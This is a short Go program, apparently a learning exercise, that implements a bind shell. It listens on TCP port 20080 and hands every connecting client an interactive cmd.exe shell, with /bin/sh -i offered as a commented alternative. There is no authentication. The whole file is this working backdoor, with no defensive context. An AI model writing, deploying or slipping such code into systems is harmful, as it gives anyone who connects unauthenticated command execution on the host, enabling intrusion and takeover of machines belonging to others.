package main

import (
	"io"      //input output opreations
	"log"     //logging function
	"net"     //remote connection tcp/ipv4
	"os/exec" //interaction with os exectution of commands
)

//create execution function
func handle(conn net.Conn) {
	/*
	*Expilcitly callign /bin/sh and using -i for interactive mode
	*so that we can use it for stdin and stdout
	 */
	//for windoes use
	cmd := exec.Command("cmd.exe")
	//cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	//Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp) //gorotuine
	cmd.Run()            //run command
	conn.Close()         //close connection
}

func main() { //create main function
	listener, err := net.Listen("tcp", ":20080") //create listner
	if err != nil {                              //check error
		log.Fatalln(err) //log error
	}

	for { //for loop
		conn, err := listener.Accept() //create listner accept
		if err != nil {                //check error
			log.Fatalln(err) //log error
		}
		go handle(conn) //goroutine for connection
	}
}
